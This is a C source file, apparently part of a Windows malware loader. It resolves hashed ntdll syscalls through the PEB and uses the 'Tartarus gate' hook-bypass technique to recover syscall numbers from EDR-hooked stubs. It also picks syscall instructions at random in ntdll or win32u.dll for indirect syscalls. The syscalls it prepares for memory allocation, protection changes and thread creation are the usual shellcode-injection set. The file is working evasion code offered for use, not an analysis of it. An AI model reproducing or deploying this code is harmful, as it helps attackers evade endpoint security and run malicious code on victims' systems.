#include "structs.h"
#include "main.h"



/*-------------------------------------------------------
Initialize all syscalls that are defined and will be used
-------------------------------------------------------*/
BOOL InitSyscls() {

    DEBUG_PRINT("[*] Initializing syscalls structure.\n");

    if (!GetSyscl(NtAllocateVirtualMemory_H, &g_Fun.NtAllocateVirtualMemory)) {
        DEBUG_PRINT("[!] Failed obtaining SSN for NtAllocateVirtualMemory.\n");
        return FALSE;
    }

    if (!GetSyscl(NtProtectVirtualMemory_H, &g_Fun.NtProtectVirtualMemory)) {
        DEBUG_PRINT("[!] Failed obtaining SSN for NtProtectVirtualMemory.\n");
        return FALSE;
    }

    if (!GetSyscl(NtWaitForSingleObject_H, &g_Fun.NtWaitForSingleObject)) {
        DEBUG_PRINT("[!] Failed obtaining SSN for NtWaitForSingleObject.\n");
        return FALSE;
    }

    if (!GetSyscl(NtCreateThreadEx_H, &g_Fun.NtCreateThreadEx)) {
        DEBUG_PRINT("[!] Failed obtaining SSN for NtCreateThreadEx.\n");
        return FALSE;
    }

    if (!GetSyscl(NtClose_H, &g_Fun.NtClose)) {
        DEBUG_PRINT("[!] Failed obtaining SSN for NtClose.\n");
        return FALSE;
    }



    DEBUG_PRINT("\n");
    DEBUG_PRINT("[*] NtAllocateVirtualMemory SSN: %d.\n", g_Fun.NtAllocateVirtualMemory.dwSSn);
    DEBUG_PRINT("[*] NtCreateThreadEx SSN: %d.\n", g_Fun.NtCreateThreadEx.dwSSn);
    DEBUG_PRINT("[*] NtProtectVirtualMemory SSN: %d.\n", g_Fun.NtProtectVirtualMemory.dwSSn);
    DEBUG_PRINT("[*] NtWaitForSingleObject SSN: %d.\n", g_Fun.NtWaitForSingleObject.dwSSn);
    DEBUG_PRINT("[*] NtClose SSN: %d.\n", g_Fun.NtClose.dwSSn);
    DEBUG_PRINT("[*] Init done!\n");
    DEBUG_PRINT("\n");

    return TRUE;
}


/*-----------------------------------------
Function to initialize the NTCONF structure
-----------------------------------------*/
BOOL NtInitConfig() {

    DEBUG_PRINT("[*] Initializing NT structure.\n");

    PPEB pPeb = (PPEB)__readgsqword(0x60);

    if (!pPeb) {
        return FALSE;
    }
    DEBUG_PRINT("[*] PEB: 0x%p\n", pPeb);

    //get ntdll module
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
    if (pLdr == NULL) {
        DEBUG_PRINT("[!] Failed getting LDR.\n");
        return FALSE;
    }

    //get the base address of ntdll
    ULONG_PTR ntdllBase = (ULONG_PTR)(pLdr->DllBase);
    if (!ntdllBase) {
        DEBUG_PRINT("[!] Failed getting DllBase.\n");
        return FALSE;
    }

    //Getting DOS headers
    PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)ntdllBase;
    if (dosHeaders->e_magic != IMAGE_DOS_SIGNATURE) {
        DEBUG_PRINT("[!] Not a valid DOS_HEADER.\n");
        return FALSE;
    }

    //Getting NT headerrs
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(ntdllBase + dosHeaders->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        DEBUG_PRINT("[!] Not a valid NT_HEADERS.\n");
        return FALSE;
    }

    //Getting the export directory
    PIMAGE_EXPORT_DIRECTORY pExpDir = (PIMAGE_EXPORT_DIRECTORY)(ntdllBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pExpDir) {
        DEBUG_PRINT("[!] Failed getting export table.\n");
        return FALSE;
    }


    //Initialize g_NtConfig
    g_NtConfig.uModule = ntdllBase;
    g_NtConfig.pdwAddressesArray = (PDWORD)((ULONG_PTR)ntdllBase + (ULONG_PTR)pExpDir->AddressOfFunctions);
    g_NtConfig.pdwNamesArray = (PDWORD)((ULONG_PTR)ntdllBase + (ULONG_PTR)pExpDir->AddressOfNames);
    g_NtConfig.pwOrdinalsArray = (PWORD)((ULONG_PTR)ntdllBase + (ULONG_PTR)pExpDir->AddressOfNameOrdinals);
    g_NtConfig.dwNamesNumber = pExpDir->NumberOfNames;

    DEBUG_PRINT("\n");
    DEBUG_PRINT("[*] ntdll base: 0x%p\n", g_NtConfig.uModule);
    DEBUG_PRINT("[*] Names array: 0x%p\n", g_NtConfig.pdwNamesArray);
    DEBUG_PRINT("[*] Addresses array: 0x%p\n", g_NtConfig.pdwAddressesArray);
    DEBUG_PRINT("[*] Ordinals array: 0x%p\n", g_NtConfig.pwOrdinalsArray);
    DEBUG_PRINT("[*] Names offset: 0x%p\n", g_NtConfig.pdwNamesArray);
    DEBUG_PRINT("[*] Addrs offset: 0x%p\n", g_NtConfig.pdwAddressesArray);
    DEBUG_PRINT("[*] Ordls offset: 0x%p\n", g_NtConfig.pwOrdinalsArray);
    DEBUG_PRINT("[*] Number of functions: %d\n", g_NtConfig.dwNamesNumber);
    DEBUG_PRINT("\n");

    //Check if everything is initialized
    if (!g_NtConfig.uModule || !g_NtConfig.dwNamesNumber || !g_NtConfig.pdwAddressesArray || !g_NtConfig.pdwNamesArray || !g_NtConfig.pwOrdinalsArray) {
        return FALSE;
    }
    else {
        DEBUG_PRINT("[*] Init NT struct finished.\n");
        return TRUE;
    }
}



/*----------------------------------------------
Get syscall information based on a function hash
----------------------------------------------*/
BOOL GetSyscl(IN DWORD dwSysHash, OUT PSYSCALL pSyscl) {

    DEBUG_PRINT("[*] Fetching information about syscall: 0x%0.8X.\n", dwSysHash);
    //Initialize the structure if its not already
    if (!g_NtConfig.uModule) {
        if (!NtInitConfig()) {
            DEBUG_PRINT("[!] NTConfig init failed\n");
            return FALSE;
        }
    }

    //Check if api hash is provided and update the syscall structure
    if (dwSysHash != NULL) {
        pSyscl->dwSyscallHash = dwSysHash;
    }
    else {
        DEBUG_PRINT("[!] No function hash provided.\n");
        return FALSE;
    }

    //Search for the hash in ntdll's exports
    for (size_t i = 0; i < g_NtConfig.dwNamesNumber; i++) {

        PCHAR funcName = (PCHAR)(g_NtConfig.uModule + g_NtConfig.pdwNamesArray[i]);
        PVOID funcAddr = (PVOID)(g_NtConfig.uModule + g_NtConfig.pdwAddressesArray[g_NtConfig.pwOrdinalsArray[i]]);

        //Check if correct syscall is found, search based on the tartarus gate technique
        if (HashA(funcName) == dwSysHash) {

            //Save the function address
            pSyscl->pSyscallAddress = funcAddr;

            if (*((PBYTE)funcAddr) == 0x4C
                && *((PBYTE)funcAddr + 1) == 0x8B
                && *((PBYTE)funcAddr + 2) == 0xD1
                && *((PBYTE)funcAddr + 3) == 0xB8
                && *((PBYTE)funcAddr + 6) == 0x00
                && *((PBYTE)funcAddr + 7) == 0x00) {

                BYTE high = *((PBYTE)funcAddr + 5);
                BYTE low = *((PBYTE)funcAddr + 4);
                pSyscl->dwSSn = (high << 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)funcAddr) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)funcAddr + idx * DOWN) == 0x4C
                        && *((PBYTE)funcAddr + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)funcAddr + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)funcAddr + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)funcAddr + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)funcAddr + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)funcAddr + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)funcAddr + 4 + idx * DOWN);
                        pSyscl->dwSSn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)funcAddr + idx * UP) == 0x4C
                        && *((PBYTE)funcAddr + 1 + idx * UP) == 0x8B
                        && *((PBYTE)funcAddr + 2 + idx * UP) == 0xD1
                        && *((PBYTE)funcAddr + 3 + idx * UP) == 0xB8
                        && *((PBYTE)funcAddr + 6 + idx * UP) == 0x00
                        && *((PBYTE)funcAddr + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)funcAddr + 5 + idx * UP);
                        BYTE low = *((PBYTE)funcAddr + 4 + idx * UP);
                        pSyscl->dwSSn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)funcAddr + 3) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)funcAddr + idx * DOWN) == 0x4C
                        && *((PBYTE)funcAddr + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)funcAddr + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)funcAddr + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)funcAddr + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)funcAddr + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)funcAddr + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)funcAddr + 4 + idx * DOWN);
                        pSyscl->dwSSn = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)funcAddr + idx * UP) == 0x4C
                        && *((PBYTE)funcAddr + 1 + idx * UP) == 0x8B
                        && *((PBYTE)funcAddr + 2 + idx * UP) == 0xD1
                        && *((PBYTE)funcAddr + 3 + idx * UP) == 0xB8
                        && *((PBYTE)funcAddr + 6 + idx * UP) == 0x00
                        && *((PBYTE)funcAddr + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)funcAddr + 5 + idx * UP);
                        BYTE low = *((PBYTE)funcAddr + 4 + idx * UP);
                        pSyscl->dwSSn = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }
            break; //Break from the for-loop
        }
    }

    /*--------------------------------------------------------------------------------------------------------------------------
      Try to get a different syscall address for an indirect call
      - Checks if the syscall's address is successfully retrieved.
      - Add 0xFF or 225 bytes (in decimal) to the address of the syscall function to search for a syscall instruction.
      - Initiates a for-loop that searches for the opcodes 0x0f and 0x05 which represent the syscall instruction.
      - The search boundary is RANGE which is 225, meaning that this for-loop can search 225 bytes for the syscall instruction.
      - When a match is found, pSyscallIndJmp is set to the address of the retrieved syscall instruction.
    ---------------------------------------------------------------------------------------------------------------------------*/
    if (!pSyscl->pSyscallAddress) {
        return FALSE;
    }

#ifdef WIN32_JMP
    PVOID syscallJmp = NULL;
    if (!FetchWin32Syscall(&syscallJmp)) {
        DEBUG_PRINT("[!] Could not find a syscall address in Win32u.dll\n");
        return FALSE;
    }
    pSyscl->pSyscallIndJmp = syscallJmp;

#elif !defined(WIN32_JMP)
    //Looking somewhere random 0xFF(225) bytes away from the syscall's address
    ULONG_PTR uFuncAddr = (ULONG_PTR)pSyscl->pSyscallAddress + 0xFF;

    //Getting the 'syscall' instruction of another syscall function
    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddr + z) == 0x0F && *((PBYTE)uFuncAddr + x) == 0x05) {
            pSyscl->pSyscallIndJmp = ((ULONG_PTR)uFuncAddr + z);
            DEBUG_PRINT("[*] Found a jump address for indirect syscall: 0x%p.\n", pSyscl->pSyscallIndJmp);
            break;
        }
    }
    /*---------------------------------------------------------------------------------------------------------*/
#endif
    //Check if all members of pSyscl are initialized
    if (pSyscl->dwSSn != NULL && pSyscl->dwSyscallHash != NULL && pSyscl->pSyscallAddress != NULL && pSyscl->pSyscallIndJmp != NULL) {
        return TRUE;
    }
    else {
        DEBUG_PRINT("[!] Failed getting information about specified syscall.\n");
        return FALSE;
    }
    return TRUE;
}



/*---------------------------------------
  Try to get syscall instruction address
  which is not located in ntdll
  1. Make sure that win32u.dll is loaded
  in the IAT by invoking SHGetFolderPathW
  2. Get a handle to it and search
  for a syscall instruction
---------------------------------------*/
#ifdef WIN32_JMP

VOID AddWin32() {
#define CSIDL_MYVIDEO 0x000E

    WCHAR szVar[MAX_PATH] = {0};
    SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szVar);
}

BOOL ParseWin32(ULONG_PTR moduleBase) {
    
    g_Win32u.uModule = moduleBase;

    DEBUG_PRINT("[*] Parsing PE headers for win32u.dll\n");
    //Get the NT headers
    PIMAGE_NT_HEADERS NtHdrs = (PIMAGE_NT_HEADERS)(g_Win32u.uModule + ((PIMAGE_DOS_HEADER)g_Win32u.uModule)->e_lfanew);

    DEBUG_PRINT("\t> Getting export directory\n");
    PIMAGE_EXPORT_DIRECTORY pExpDir = (PIMAGE_EXPORT_DIRECTORY)(g_Win32u.uModule + NtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DEBUG_PRINT("\t> Getting export directory entries\n");
    g_Win32u.pdwAddressesArray = (PDWORD)(g_Win32u.uModule + pExpDir->AddressOfFunctions);
    g_Win32u.pdwNamesArray = (PDWORD)(g_Win32u.uModule + pExpDir->AddressOfNames);
    g_Win32u.pwOrdinalsArray = (PWORD)(g_Win32u.uModule + pExpDir->AddressOfNameOrdinals);
    g_Win32u.dwNamesNumber = pExpDir->NumberOfNames;

    if (!g_Win32u.pdwAddressesArray || !g_Win32u.pdwNamesArray || !g_Win32u.pwOrdinalsArray || !g_Win32u.dwNamesNumber) {
        DEBUG_PRINT("[!] Could not initialize win32u structure\n");
        return FALSE;
    }
    return TRUE;
}


BOOL FetchWin32Syscall(PVOID* pSyscallJmpAddr) {
#define	SYSCALL_STUB_SIZE            0x20

    int Seed = rand() % 0x10,  // Between 0 and 15
        Count = 0;


    if (!g_Win32u.uModule) {
        AddWin32();
        if (!ParseWin32(GetModuleHandle(L"win32u.dll"))) {
            DEBUG_PRINT("[!] Failed initializing Win32u structure\n");
            return FALSE;
        }
    }

    DEBUG_PRINT("[*] Searching for syscall in win32u.dll\n");
    for (DWORD i = 0; i < g_Win32u.dwNamesNumber; i++) {

        PCHAR funName = (PCHAR)(g_Win32u.uModule + g_Win32u.pdwNamesArray[i]);
        PVOID funAddr = (PVOID)(g_Win32u.uModule + g_Win32u.pdwAddressesArray[g_Win32u.pwOrdinalsArray[i]]);

        for (DWORD z = 0; z < SYSCALL_STUB_SIZE; z++) {
            
            //Search for syscall instruction, followed by ret instruction
            if (*(unsigned short*)((ULONG_PTR)funAddr + z) == 0x050F && 
                *(BYTE*)((ULONG_PTR)funAddr + z + sizeof(unsigned short)) == 0xC3) 
            {
                // Used to resolve a random instruction every time
                if (Seed == Count) {
                    *pSyscallJmpAddr = (PVOID)((ULONG_PTR)funAddr + z);
                    break;
                }
                Count++;
            }
        }
        if (*pSyscallJmpAddr) {
            DEBUG_PRINT("\t> Found jump address: 0x%p\n", *pSyscallJmpAddr);
            return TRUE;
        }
    }
    return FALSE;
}

#endif